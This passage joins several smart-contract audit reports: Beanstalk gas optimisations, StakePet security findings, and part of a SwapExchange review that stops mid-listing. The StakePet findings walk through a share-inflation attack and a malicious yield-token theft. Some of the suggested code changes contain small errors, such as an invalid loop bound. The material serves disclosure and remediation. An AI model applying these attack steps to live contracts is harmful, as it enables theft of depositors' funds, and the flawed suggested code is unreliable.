36:        return balances[1].mul(C.curve3Pool().get_virtual_price()).div(1e30);

86:            dy_0.sub(dy).mul(ADMIN_FEE).div(FEE_DENOMINATOR)
```

```solidity
File: /libraries/Curve/LibBeanMetaCurve.sol

114:        balance0 = xp0.div(RATE_MULTIPLIER);
```

```solidity
File: /libraries/Curve/LibCurve.sol

160:        xp[1] = balances[1].mul(rate).div(PRECISION);

171:        xp[0] = balances[0].mul(rates[0]).div(PRECISION);
172:        xp[1] = balances[1].mul(rates[1]).div(PRECISION);
```

```solidity
File: /libraries/Minting/LibMinting.sol

22:        int256 maxDeltaB = int256(C.bean().totalSupply().div(MAX_DELTA_B_DENOMINATOR));
```

```solidity
File: /libraries/Oracle/LibChainlinkOracle.sol

63:            return uint256(answer).mul(PRECISION).div(10**decimals);
```

```solidity
File: /libraries/Oracle/LibEthUsdOracle.sol

58:            return chainlinkPrice.add(usdcPrice).div(2);

68:                return chainlinkPrice.add(usdtPrice).div(2);

74:                return chainlinkPrice.add(usdcPrice).div(2);
```

```solidity
File: /libraries/Silo/LibLegacyTokenSilo.sol

143:             uint256 removedBDV = amount.mul(crateBDV).div(crateAmount);
```

```solidity
File: /libraries/Silo/LibSilo.sol

493:                   plentyPerRoot.mul(s.a[account].sop.roots).div(
494:                       C.SOP_PRECISION
495:                   )


507:               plentyPerRoot.mul(s.a[account].roots).div(
508:                   C.SOP_PRECISION
509:                )
```

```solidity
File: /libraries/Silo/LibTokenSilo.sol

390:        ).div(1e6); //round here

460:        int96 grownStalkPerBdv = bdv > 0 ? toInt96(grownStalk.div(bdv)) : 0;
```

```solidity
File: /libraries/Silo/LibUnripeSilo.sol

131:            .add(legacyAmount.mul(C.initialRecap()).div(1e18));

201:            .div(C.precision());

246:            .div(1e18);

267:        ).mul(AMOUNT_TO_BDV_BEAN_LUSD).div(C.precision());

288:        ).mul(AMOUNT_TO_BDV_BEAN_3CRV).div(C.precision());
```

```solidity
File: /libraries/Decimal.sol

228:        return self.value.div(BASE);
```

```solidity
File: /libraries/LibFertilizer.sol

80:            newDepositedBeans = newDepositedBeans.mul(percentToFill).div(
81:                C.precision()
82:            );

86:        uint256 newDepositedLPBeans = amount.mul(C.exploitAddLPRatio()).div(
87:            DECIMALS
88:        );

145:            .div(DECIMALS);
```

```solidity
File: /libraries/LibFertilizer.sol

99:            BASE_REWARD + gasCostWei.mul(beanEthPrice).div(1e18), // divide by 1e18 to convert wei to eth

230:        return beans.mul(scaler).div(FRAC_EXP_PRECISION);
```

```solidity
File: /libraries/LibPolynomial.sol

77:                positiveSum = positiveSum.add(pow(x, degree).mul(significands[degree]).div(pow(10, exponents[degree])));

79:                negativeSum = negativeSum.add(pow(x, degree).mul(significands[degree]).div(pow(10, exponents[degree])));

124:                positiveSum = positiveSum.add(pow(end, 1 + degree).mul(significands[degree]).div(pow(10, exponents[degree]).mul(1 + degree)));

126:                positiveSum = positiveSum.sub(pow(start, 1 + degree).mul(significands[degree]).div(pow(10, exponents[degree]).mul(1 + degree)));

128:                negativeSum = negativeSum.add(pow(end, 1 + degree).mul(significands[degree]).div(pow(10, exponents[degree]).mul(1 + degree)));

130:                negativeSum = negativeSum.sub(pow(start, 1 + degree).mul(significands[degree]).div(pow(10, exponents[degree]).mul(1 + degree)));
```


### Avoid repeated comparison with `msg.sender` when looping in `SiloFacet:transferDeposits`

Currently, `SiloFacet:transferDeposits` performs the same comparison every loop iteration, but this can be done just once outside the for loop:

```diff
// SiloFacet:transferDeposits
//...
+       bool callerIsNotSender = sender != msg.sender;
        for (uint256 i = 0; i < amounts.length; ++i) {
            require(amounts[i] > 0, "Silo: amount in array is 0");
-           if (sender != msg.sender) {
+           if (callerIsNotSender) {
                LibSiloPermit._spendDepositAllowance(sender, msg.sender, token, amounts[i]);
            }
        }
//...
```

Alternatively, the logic can be divided into two separate for loops to more efficiently handle this case:

```diff
// SiloFacet:transferDeposits
//...
+   if (sender != msg.sender){
        for (uint256 i = 0; i < amounts.length; ++i) {
            require(amounts[i] > 0, "Silo: amount in array is 0");
-           if (sender != msg.sender) {
                LibSiloPermit._spendDepositAllowance(sender, msg.sender, token, amounts[i]);
-           }
        }
+   } else {
+       for (uint256 i = 0; i < amounts.length; ++i) {
+           require(amounts[i] > 0, "Silo: amount in array is 0");
+       }
+   }
//...
```


### Extract logic for the last element when looping over Stems in `EnrootFacet::enrootDeposits`

Currently, the `i+1 == stems.length` [condition](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/EnrootFacet.sol#L139) is checked during each iteration when looping over Stems in `EnrootFacet::enrootDeposits`. This can be modified to save gas, as shown below:

```diff
// EnrootFacet::enrootDeposits
//...
+       uint256 stemsLengthMinusOne = stems.length - 1;
-       for (uint256 i; i < stems.length; ++i) {
+       for (uint256 i; i < stems.stemsLengthMinusOne; ++i) {
-           if (i+1 == stems.length) {
-               // Ensure that a rounding error does not occur by using the
-               // remainder BDV for the last Deposit.
-               depositBdv = newTotalBdv.sub(bdvAdded);
-           } else {
                // depositBdv is a proportional amount of the total bdv.
                // Cheaper than calling the BDV function multiple times.
                depositBdv = amounts[i].mul(newTotalBdv).div(ar.tokensRemoved);
-           }
            LibTokenSilo.addDepositToAccount(
                msg.sender,
                token,
                stems[i],
                amounts[i],
                depositBdv,
                LibTokenSilo.Transfer.noEmitTransferSingle
            );

            stalkAdded = stalkAdded.add(
                depositBdv.mul(_stalkPerBdv).add(
                    LibSilo.stalkReward(
                        stems[i],
                        _lastStem,
                        uint128(depositBdv)
                    )
                )
            );

            bdvAdded = bdvAdded.add(depositBdv);
        }
+       depositBdv = newTotalBdv.sub(bdvAdded);
+       LibTokenSilo.addDepositToAccount(
+           msg.sender,
+           token,
+           stems[stemsLengthMinusOne],
+           amounts[stemsLengthMinusOne],
+           depositBdv,
+           LibTokenSilo.Transfer.noEmitTransferSingle
+       );
+
+       stalkAdded = stalkAdded.add(
+           depositBdv.mul(_stalkPerBdv).add(
+               LibSilo.stalkReward(
+                   stems[stemsLengthMinusOne],
+                   _lastStem,
+                   uint128(depositBdv)
+               )
+           )
+       );
+
+       bdvAdded = bdvAdded.add(depositBdv);
//...
```


### Redundant condition in `LibSilo::_mow` can be removed

There is a [line](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibSilo.sol#L355) within `LibSilo::_mow` which performs some validation on the last update for a given account before handling Flood logic. The account's last update must be at least equal to the season when it started "raining" for it to be eligible for SeasonofPlenty(sop) rewards. There is also additional validation that the last update is less than or equal to the current season, which will, of course, always be the case given that it is [not possible](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibSilo.sol#L372) to update an account beyond the current season. Therefore, this condition can be removed as below:

```diff
- if (lastUpdate <= s.season.rainStart && lastUpdate <= s.season.current) {
+ if (lastUpdate <= s.season.rainStart) {
```


### `LibTokenSilo::calculateGrownStalkAndStem` appears to perform redundant calculations on the `grownStalk` parameter

[`LibTokenSilo::calculateGrownStalkAndStem`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibTokenSilo.sol#L433-L441) is used in [`ConvertFacet::_depositTokensForConvert`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/ConvertFacet.sol#L209) when calculating the grown stalk to be minted and stem index at which the corresponding deposit is to be made, accounting for the current grown stalk and Bean Denominated Value (BDV). Assuming no rounding, it appears that the calculations performed on `grownStalk` are redundant:

$\text{stem} = \text{\_stemTipForToken} - \frac{\text{grownStalk}}{\text{bdv}}$

$\text{\_grownStalk} = (\text{\_stemTipForToken} - \text{stem}) \times \text{bdv}$

$= (\text{\_stemTipForToken} - (\text{\_stemTipForToken} - \frac{\text{grownStalk}}{\text{bdv}})) \times \text{bdv}$

$= \frac{\text{grownStalk}}{\text{bdv}} \times \text{bdv}$

$= \text{grownStalk}$

$\therefore \text{\_grownStalk} \equiv \text{grownStalk}$

It is therefore recommended to perform the following modification:

```diff
    // LibTokenSilo.sol
    function calculateGrownStalkAndStem(address token, uint256 grownStalk, uint256 bdv)
        internal
        view
        returns (uint256 _grownStalk, int96 stem)
    {
        int96 _stemTipForToken = stemTipForToken(token);
        stem = _stemTipForToken.sub(toInt96(grownStalk.div(bdv)));
-       _grownStalk = uint256(_stemTipForToken.sub(stem).mul(toInt96(bdv)));
+       _grownStalk = grownStalk;
    }
```


### Ternary operator in `Sun::rewardToHarvestable` can be simplified

In [`Sun::rewardToHarvestable`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Sun.sol#L162-L172), the `newHarvestable` variable is [reassigned](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Sun.sol#L168-L170) to `notHarvestable` if it exceeds this value, essentially acting as a cap to prevent the case where the Harvestable index exceeds the Pod index when the reward amount is sufficiently large to cause all outstanding Pods in the Pod Line to become Harvestable. If this is not the case, such that there will remain Pods in the Pod Line that are not Harvestable, reassignment is made by the ternary operator to the existing `newHarvestable` value. This branch is not necessary and can be removed:

```diff
    newHarvestable = amount.div(HARVEST_DENOMINATOR);
-   newHarvestable = newHarvestable > notHarvestable
-       ? notHarvestable
-       : newHarvestable;
+   if (newHarvestable > notHarvestable) {
+       newHarvestable = notHarvestable;
+   }
```


### Unnecessary reassignment of `deltaB` to its default value in `LibCurveMinting::check`

When returning the time-weighted average `deltaB` in the BEAN/3CRV Metapool since the last Sunrise, `LibCurveMinting::check` unnecessarily reassigns `deltaB` to the default `int256` value (zero) if the Curve oracle is not initialized. Given that `deltaB` is declared in the function signature return value and is nowhere else used before this reassignment, this branch can be removed:

```diff
    if (s.co.initialized) {
        (deltaB, ) = twaDeltaB();
-   } else {
-       deltaB = 0;
    }
```


### Execution of `LibLegacyTokenSilo:: balanceOfGrownStalkUpToStemsDeployment` can end earlier when `lastUpdate == stemStartSeason`

Currently, `LibLegacyTokenSilo:: balanceOfGrownStalkUpToStemsDeployment` [returns zero](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibLegacyTokenSilo.sol#L188) if the last update season is greater than the Stems deployment season, given this implies the account has already been credited the grown Stalk it was owed. This optimization can also be made when the last update season is equal to the Stems deployment season, as the [multiplication](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibLegacyTokenSilo.sol#L220) of the account's Seeds by a season difference of zero yields zero outstanding grown Stalk.

```diff
- if (lastUpdate > stemStartSeason) return 0;
+ if (lastUpdate >= stemStartSeason) return 0;
```


### State variables should be cached to avoid unnecessary storage accesses

As shown below, `s.season.current` can be cached to save one storage access:
```diff
    // SeasonFacet.sol
    function stepSeason() private {
+       uint32 _current = s.season.current + 1
        s.season.timestamp = block.timestamp;
-       s.season.current += 1;
+       s.season.current = _current ;
        s.season.sunriseBlock = uint32(block.number); // Note: Will overflow in the year 3650.
-       emit Sunrise(season());
+       emit Sunrise(_current );
    }
```

\clearpage

------ FILE END car/reports_md/2023-09-12-cyfrin-beanstalk.md ------


------ FILE START car/reports_md/2023-09-19-cyfrin-stakepet.md ------

**Lead Auditors**

[Hans](https://twitter.com/hansfriese)

**Assisting Auditors**

[0kage](https://twitter.com/0kage_eth)


---

# Findings
## High Risk

### Attackers can use a malicious yield token to steal funds from users

**Severity:** High

**Description:** According to the documentation and the current implementation, anyone can create a new StakePet contract and feed any address for the `YIELD_TOKEN`. As long as a contract implements `IYieldToken` interface, the contract will be created without problems.

An attacker can create a malicious `IYieldToken` implementation and use that to steal funds from users.
The StakePet contract relies on `YIELD_TOKEN.toToken()` and `YIELD_TOKEN.toValue()` in numerous places for accounting.
Consider a contract that has implemented different logic in `toToken()` and `toValue()` according to the owner's hidden flag.
The attacker is likely to let the malicious token contract work normally till the StakePet contract gets enough deposits.
Then they can switch the hidden flag as they needed to mess the accounting and take profit from it.
In the worst case, they can even manipulate the output of `IYieldToken::ERC20_TOKEN()` (maybe to freeze the user funds permanently).

**Impact:** User funds can be stolen or permanently locked.

**Recommended Mitigation:** Consider maintaining a whitelist of YIELD_TOKEN and allow creation of StakePet for only allowed yield tokens.

**Client:** Fixed in commit [308672e](https://github.com/Ranama/StakePet/commit/308672e914651ca2300f2b585d91f16764994bf7).

**Cyfrin:** Verified.

### Inflation attack can cause early users to lose their deposit

**Severity:** High

**Description:** A malicious `StakePet` contract creator can steal funds from depositors by launching a typical inflation attack. To execute the attack, the creator can first deposit `1 wei` to get `1 wei` of ownership. Creator can subsequently send a big amount of collateral directly to the `StakePet` contract - this will hugely inflate the value of the single share.

Now, all subsequent pet owners who deposit their collateral will get no ownership in return. The `StakePet::ownershipToMint` function uses `StakePet::totalValue` to calculate the ownership of a new depositor. While the total ownership represented by `s_totalOwnership` remains the same `1 wei`, the `totalValueBefore` is a huge number, thanks to a large direct deposit done by the creator. This ensures that the 1 wei of share represents a huge value of collateral & causes the ownership of new depositors to round to 0.

**Impact:** Potential complete loss of funds for new depositors, given they receive no ownership in exchange for their deposited tokens.

**Proof of Concept:**
- Bob, a malicious actor, initiates the StakePet contract.
- By calling `StakePet::create`, Bob creates a pet depositing a mere `1 wei`, which grants him `1 wei` of ownership.
- Bob then directly transfers a significant amount, like 10 ether, to the `StakePet` contract.
- Consequently, a single `1 wei` share becomes equivalent to `10 ether`.
- An innocent user, Pete, tries to create a pet by calling `StakePet::create` and deposits 1 ether.
- Pete, unfortunately, receives zero ownership while his deposit remains within the contract

**Recommended Mitigation:** Inflation attacks have known defences. A comprehensive discussion can be found [here](https://github.com/OpenZeppelin/openzeppelin-contracts/issues/3706).

One noteworthy method, as implemented by Uniswap V2, involves depositing minimal liquidity into the contract and transferring its ownership to a null address, creating "dead shares". This technique protects the subsequent depositor from potential inflation attacks.

In this case, it might be beneficial to introduce a minimum collateral requirement during contract initiation, and accordingly adjust `s_totalOwnership` to match this preset collateral.

**Client:** Fixed in commit [a692abc](https://github.com/Ranama/StakePet/commit/a692abc038fdd8992916f93d213a38c30e3a9764) and [21dd15b](https://github.com/Ranama/StakePet/commit/21dd15b1fceecddb9caf47739b6df1a4d1856367).

**Cyfrin:** Verified.

## Medium Risk

### A malicious user can grief a `StakePet` contract by creating massive number of pets

**Severity:** Medium

**Description:** The `StakePet::create` function facilitates the minting of a pet NFT by depositing collateral. However, its lack of a minimum deposit requirement for minting exposes it to potential abuse. A malicious user can exploit this by minting an excessive number of NFTs. Notably, this behaviour can strain functions like `StakePetManager::buryAllDeadPets`, which in turn calls `StakePetManager::getDeadNonBuriedPets`. This latter function iterates through all pet IDs to identify pets that are dead but not yet buried.

**Impact:** When a function processes an extensive and potentially unlimited list of pet IDs, there's a risk of it consuming all available gas. Consequently, it can fail, throwing an out-of-gas exception, which negatively affects users trying to interact with the contract.

**Recommended Mitigation:** To deter such griefing attacks, it's advisable to introduce a minimum deposit requirement for the creation of a new pet. Setting this threshold ensures that the mass-minting strategy becomes cost-prohibitive for attackers.

**Client:** Fixed in commit [a692abc](https://github.com/Ranama/StakePet/commit/a692abc038fdd8992916f93d213a38c30e3a9764).

**Cyfrin:** Verified.

## Low Risk

### Closedown condition is inconsistent with the stated documentation of majority agreement

**Severity:** Low

**Description:** [Documentation](https://hackmd.io/CPINxScvSE2vo-t8mwY_Og#Risks) states the following:

_"Closing the Contract: If the majority of the pets agree, they can vote to close the contract. Once closed, the remaining funds will be divided among the surviving pets. This is the most beneficial scenario for you, as youll earn the base rewards, early withdrawal rewards, and rewards from dead pets."_

Inline comments for the [`StakePet::closedown`](https://github.com/Ranama/StakePet/blob/9ba301823b5062d657baa3462224da498dc4bb46/src/StakePet.sol#L398C2-L398C2) function state the following"

```
    /// @notice Close down the contract if majority wants it, after closedown everyone can withdraw without getting a yield cut and no pet can die.
    function closedown(uint256[] memory _idsOfMajorityThatWantsClosedown) external {
...
}
```

In both cases, condition for closedown is for `majority of pets` to agree for a closedown. However, the check used for `closedown` is that the total collateral of pets wanting a closedown should be atleast 50% of the total collateral. This would mean that a single or few pet owners with large collateral deposits can trigger a closedown even if its not something that a majority of pet owners agree to.

Having 50% of value agreement and having majority agreement could be 2 different things.

**Impact:** The current model can be hijacked by whales who can trigger closedown of contract whenever they wish to. This could create a bad user experience for majority of pet owners who want to stay in the contract

**Recommended Mitigation:** Please make documentation consistent with the vision for stake pets.

**Client:** Fixed in [54a4dcb](https://github.com/Ranama/StakePet/commit/54a4dcbb696da3138dc0fdd8e7032d664d32b7da)

**Cyfrin:** Verified.

### Exit fees implementation is inconsistent with documentation

**Severity:** Low

**Description:** Inline comments of `StakePet` contract indicate that exit fee is charged as % of the collateral.

```
The contract also has an early exit fee, which is a percentage of the collateral taken if a participant chooses to exit early.
```

However, implementation shows that exit fee is charged as a [percent of yield](https://github.com/Ranama/StakePet/blob/9ba301823b5062d657baa3462224da498dc4bb46/src/StakePet.sol#L559)

```
uint256 earlyExitFee = (uint256(yieldToWithdraw) * EARLY_EXIT_FEE) / BASIS_POINT
```

**Recommended Mitigation:** Consider correcting code documentation to reflect actual implementation

**Client:** Fixed in [54a4dcb](https://github.com/Ranama/StakePet/commit/54a4dcbb696da3138dc0fdd8e7032d664d32b7da)

**Cyfrin:** Verified.

## Gas Optimizations

### Using bools for storage incurs overhead

Use uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas), and to avoid Gsset (20000 gas) when changing from false to true, after having been true in the past. See [source](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27).

```solidity
File: StakePet.sol

91:     bool public constant TESTING = true; // TODO: Remove this when not testing

107:     bool public immutable HARDCORE; // Whether the initial collateral is taken if failing to proof of life or not

```

**Client:** Fixed in [aea1f74](https://github.com/Ranama/StakePet/commit/aea1f7464339cb16008143440bd427b6f0a14669)

**Cyfrin:** Verified.

### Cache array length outside of loop

If not cached, the solidity compiler will always read the length of the array during each iteration. That is, if it is a storage array, this is an extra sload operation (100 additional extra gas for each iteration except for the first) and if it is a memory array, this is an extra mload operation (3 additional gas for each iteration except for the first).

```solidity
File: StakePet.sol

410:         for (uint256 i = 0; i < _idsOfMajorityThatWantsClosedown.length; i++) {

```

```solidity
File: StakePetManager.sol

73:         for (uint256 i = 0; i < _contractIDs.length; i++) {

75:             for (uint256 j = 0; j < _petIDs[i].length; j++) {

108:         for (uint256 i = 0; i < _contractIDs.length; i++) {

110:             for (uint256 j = 0; j < _petIDs[i].length; j++) {

147:         for (uint256 i = 0; i < _contractIDs.length; i++) {

```

**Client:** Fixed in [627d09c](https://github.com/Ranama/StakePet/commit/627d09c34bb4853418e8c22ed8ce291efd7ad087)

**Cyfrin:** Verified.

### Don't initialize variables with default value

```solidity
File: StakePet.sol

128:     uint256 public s_closedAtTimestamp = 0; // The timestamp that the contract was closed down

409:         uint256 _totalValueWantsClosedown = 0;

410:         for (uint256 i = 0; i < _idsOfMajorityThatWantsClosedown.length; i++) {

```

```solidity
File: StakePetManager.sol

73:         for (uint256 i = 0; i < _contractIDs.length; i++) {

75:             for (uint256 j = 0; j < _petIDs[i].length; j++) {

108:         for (uint256 i = 0; i < _contractIDs.length; i++) {

110:             for (uint256 j = 0; j < _petIDs[i].length; j++) {

123:         uint256 j = 0;

137:         for (uint256 i = 0; i < j; i++) {

147:         for (uint256 i = 0; i < _contractIDs.length; i++) {

```

**Client:** Fixed in [970b71c](https://github.com/Ranama/StakePet/commit/970b71cfe73760dc694b0c0e1e5a3a77dc704c8c)

**Cyfrin:** Verified.

### `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too)

```solidity
File: StakePet.sol

410:         for (uint256 i = 0; i < _idsOfMajorityThatWantsClosedown.length; i++) {

```

```solidity
File: StakePetManager.sol

73:         for (uint256 i = 0; i < _contractIDs.length; i++) {

75:             for (uint256 j = 0; j < _petIDs[i].length; j++) {

108:         for (uint256 i = 0; i < _contractIDs.length; i++) {

110:             for (uint256 j = 0; j < _petIDs[i].length; j++) {

127:         for (uint256 i = 1; i <= currentPetId; i++) {

131:                 j++;

137:         for (uint256 i = 0; i < j; i++) {

147:         for (uint256 i = 0; i < _contractIDs.length; i++) {

```

**Client:** Fixed in [27225c2](https://github.com/Ranama/StakePet/commit/27225c256c3173cc306045949584b66be7f60c0f)

**Cyfrin:** Verified.

### Use shift Right/Left instead of division/multiplication if possible

```solidity
File: StakePet.sol

420:         if (_totalValueWantsClosedown <= totalValue() / 2) {

```

**Client:** Fixed in [540cca1](https://github.com/Ranama/StakePet/commit/540cca16669ee8575806d0f3430723726e3d9c2e)

**Cyfrin:** Verified.

### Use != 0 instead of > 0 for unsigned integer comparison

```solidity
File: StakePet.sol

269:         if (_amount > 0) {

299:         if (!petAlive && pet.ownership > 0) {

432:         if (totYield > 0) {

497:             if (_milkAmount > 0) {

541:         if (yieldToWithdraw > 0) {

558:                 require(yieldToWithdraw > 0); // This should never be hit and is maybe not needed, but just in case.

562:                 require(yieldToWithdraw > 0); // This should never be hit and is maybe not needed, but just in case.

709:         if (_totalYieldNoMilk > 0) {

723:         if (s_totalOwnership > 0) {

741:         if (s_totalOwnership > 0) {

```

```solidity
File: StakePetManager.sol

129:             if (!stakePetContract.alive(pet.lastProofOfLife) && pet.ownership > 0) {

```

**Client:** Fixed in [9e3d0d0](https://github.com/Ranama/StakePet/commit/9e3d0d0c1b6a324e22e0e3f70453c6d411cd9101)

**Cyfrin:** Verified.

------ FILE END car/reports_md/2023-09-19-cyfrin-stakepet.md ------


------ FILE START car/reports_md/2023-09-19-cyfrin-swapexchange.md ------

**Lead Auditors**

[Hans](https://twitter.com/hansfriese)

**Assisting Auditors**

[0kage](https://twitter.com/0kage_eth)


---

# Findings
## Medium Risk

### Use safe transfer for ERC20 tokens

**Severity:** Medium

**Description:** The protocol intends to support all ERC20 tokens but the implementation uses the original transfer functions.
Some tokens (like USDT) do not implement the EIP20 standard correctly and their transfer/transferFrom function return void instead of a success boolean. Calling these functions with the correct EIP20 function signatures will revert.

```solidity
TransferUtils.sol
34:     function _transferERC20(address token, address to, uint256 amount) internal {
35:         IERC20 erc20 = IERC20(token);
36:         require(erc20 != IERC20(address(0)), "Token Address is not an ERC20");
37:         uint256 initialBalance = erc20.balanceOf(to);
38:         require(erc20.transfer(to, amount), "ERC20 Transfer failed");//@audit-issue will revert for USDT
39:         uint256 balance = erc20.balanceOf(to);
40:         require(balance >= (initialBalance + amount), "ERC20 Balance check failed");
41:     }
```

**Impact:** Tokens that do not correctly implement the EIP20 like USDT, will be unusable in the protocol as they revert the transaction because of the missing return value.

**Recommended Mitigation:** We recommend using OpenZeppelin's SafeERC20 versions with the safeTransfer and safeTransferFrom functions that handle the return value check as well as non-standard-compliant tokens.

**Protocol:** Fixed in commit [564f711](https://github.com/SwapExchangeio/Contracts/commit/564f711c6f915f5a7696739266a1f8059ee9a172)

**Cyfrin:** Verified.

### Fee-on-transfer tokens are not supported

**Severity:** Medium

**Description:** The protocol intends to support all ERC20 tokens but does not support fee-on-transfer tokens.
The protocol utilizes the functions `TransferUtils::_transferERC20()` and `TransferUtils::_transferFromERC20()` to transfer ERC20 tokens.

```solidity
TransferUtils.sol
34:     function _transferERC20(address token, address to, uint256 amount) internal {
35:         IERC20 erc20 = IERC20(token);
36:         require(erc20 != IERC20(address(0)), "Token Address is not an ERC20");
37:         uint256 initialBalance = erc20.balanceOf(to);
38:         require(erc20.transfer(to, amount), "ERC20 Transfer failed");
39:         uint256 balance = erc20.balanceOf(to);
40:         require(balance >= (initialBalance + amount), "ERC20 Balance check failed");//@audit-issue reverts for fee on transfer token
41:     }
```

The implementation verifies that the transfer was successful by checking that the balance of the recipient is greater than or equal to the initial balance plus the amount transferred. This check will fail for fee-on-transfer tokens because the actual received amount will be less than the input amount. (Read [here](https://github.com/d-xo/weird-erc20#fee-on-transfer) about fee-on-transfer tokens)

Although there are very few fee-on-transfer tokens, the protocol can't say it supports all ERC20 tokens if it doesn't support these weird ERC20 tokens.

**Impact:** Fee-on-transfer tokens can not be used for the protocol.
Because of the rarity of these tokens, we evaluate this finding as a Medium risk.

**Recommended Mitigation:** The transfer utility functions can be updated to return the actually received amount.
Or clearly document that only standard ERC20 tokens are supported.

**Protocol:** We are choosing not to implement this at this stage.

**Cyfrin:** Acknowledged. As recommended, please mention this in user documentation.

### Centralization risk

**Severity:** Medium

**Description:** The protocol has an owner with privileged rights to perform admin tasks that can affect users.
Especially, the owner can change the fee settings and reward handler address.

1. Validation is missing for admin fee setter functions.

```solidity
FeeData.sol
31:     function setFeeValue(uint256 feeValue) external onlyOwner {
32:         require(feeValue < _feeDenominator, "Fee percentage must be less than 1");
33:         _feeValue = feeValue;
34:     }

43:
44:     function setFixedFee(uint256 fixedFee) external onlyOwner {//@audit-issue validate min/max
45:         _fixedFee = fixedFee;
46:     }
```

2. Important changes initiated by admin should be logged via events.

```solidity
File: helpers/FeeData.sol

31:     function setFeeValue(uint256 feeValue) external onlyOwner {

36:     function setMaxHops(uint256 maxHops) external onlyOwner {

40:     function setMaxSwaps(uint256 maxSwaps) external onlyOwner {

44:     function setFixedFee(uint256 fixedFee) external onlyOwner {

48:     function setFeeToken(address feeTokenAddress) public onlyOwner {

53:     function setFeeTokens(address[] memory feeTokenAddresses) public onlyOwner {

60:     function clearFeeTokens() public onlyOwner {

```

```solidity
File: helpers/TransferHelper.sol

86:     function setRewardHandler(address rewardAddress) external onlyOwner {

92:     function setRewardsActive(bool _rewardsActive) external onlyOwner {

```

**Impact:** While the protocol owner is regarded as a trusted party, the owner can change the fee settings and reward handler address without any validation or logging. This can lead to unexpected results and users can be affected.

**Recommended Mitigation:**
- Specify the owner's privileges and responsibilities in the documentation.
- Add constant state variables that can be used as the minimum and maximum values for the fee settings.
- Add proper validation for the admin functions.
- Log the changes in the important state variables via events.

**Protocol:**

- setFeeNumerator changes fixed in commit [f8f07c5](https://github.com/SwapExchangeio/Contracts/commit/f8f07c5e72c052d11c1b4c4dfd8b849a99694e03)
- setFeeNumerator maximum reduced in commit [7874a8f](https://github.com/SwapExchangeio/Contracts/commit/7874a8f677b1e06e9b3e0289a91ab33e46806ff2)
- setFixedFee changes fixed in commit [af760b4](https://github.com/SwapExchangeio/Contracts/commit/af760b484ff6da0ad9a8492a96a5e7ef19056df1)
- events for setFeeToken/clearFeeToken/setFeeTokens as well as separating initialization setter to save emitting a heap of events when deploying, fixed in commit [927c102](https://github.com/SwapExchangeio/Contracts/commit/[927c1020a71c017d3a17e653be84996ba86ff8ed])
- changing array arg type to calldata rather than memory, fixed in commit [e615cb2](https://github.com/SwapExchangeio/Contracts/commit/e615cb21ac67d8a31656c622d3b2e3ddc1dc8891)
- events for RewardHandler and RewardsActive, fixed in commit [3068a2e](https://github.com/SwapExchangeio/Contracts/commit/3068a2e88621f991a54be80ef16d868e4fb10d25)
- events for MaxHops and MaxSwaps, fixed in commit [077577b](https://github.com/SwapExchangeio/Contracts/commit/077577ba26b66cbb4b977b3738b59eb727c5d87d).

**Cyfrin:** Verified.

## Low Risk

### Validation is missing for tokenA in `SwapExchange::calculateMultiSwap()`

**Severity:** Low

**Description:** The protocol supports claiming a chain of swaps and the function `SwapExchange::calculateMultiSwap()` is used to do some calculations including the amount of tokenA that can be received for a given amount of tokenB.
Looking at the implementation, the protocol does not validate that the tokenA of the last swap in the chain is actually the same as the tokenA of `multiClaimInput`.
Because this view function is supposed to be used by the frontend to 'preview' the result of a `MultiSwap`, this does not imply a direct security risk but can lead to unexpected results. (It is notable that the actual swap function `SwapExchange::_claimMultiSwap()` implemented a proper validation.)

```solidity
SwapExchange.sol
150:     function calculateMultiSwap(SwapUtils.MultiClaimInput calldata multiClaimInput) external view returns (SwapUtils.SwapCalculation memory) {
151:         uint256 swapIdCount = multiClaimInput.swapIds.length;
152:         if (swapIdCount == 0 || swapIdCount > _maxHops) revert Errors.InvalidMultiClaimSwapCount(_maxHops, swapIdCount);
153:         if (swapIdCount == 1) {
154:             SwapUtils.Swap memory swap = swaps[multiClaimInput.swapIds[0]];
155:             return SwapUtils._calculateSwapNetB(swap, multiClaimInput.amountB, _feeValue, _feeDenominator, _fixedFee);
156:         }
157:         uint256 matchAmount = multiClaimInput.amountB;
158:         address matchToken = multiClaimInput.tokenB;
159:         uint256 swapId;
160:         bool complete = true;
161:         for (uint256 i = 0; i < swapIdCount; i++) {
162:             swapId = multiClaimInput.swapIds[i];
163:             SwapUtils.Swap memory swap = swaps[swapId];
164:             if (swap.tokenB != matchToken) revert Errors.NonMatchingToken();
165:             if (swap.amountB < matchAmount) revert Errors.NonMatchingAmount();
166:             if (matchAmount < swap.amountB) {
167:                 if (!swap.isPartial) revert Errors.NotPartialSwap();
168:                 matchAmount = MathUtils._mulDiv(swap.amountA, matchAmount, swap.amountB);
169:                 complete = complete && false;
170:             }
171:             else {
172:                 matchAmount = swap.amountA;
173:             }
174:             matchToken = swap.tokenA;
175:         }
176:         (uint8 feeType,) = _calculateFeeType(multiClaimInput.tokenA, multiClaimInput.tokenB);//@audit-issue no validation matchToken == multiClaimInput.tokenA
177:         uint256 fee = FeeUtils._calculateFees(matchAmount, multiClaimInput.amountB, feeType, swapIdCount, _feeValue, _feeDenominator, _fixedFee);
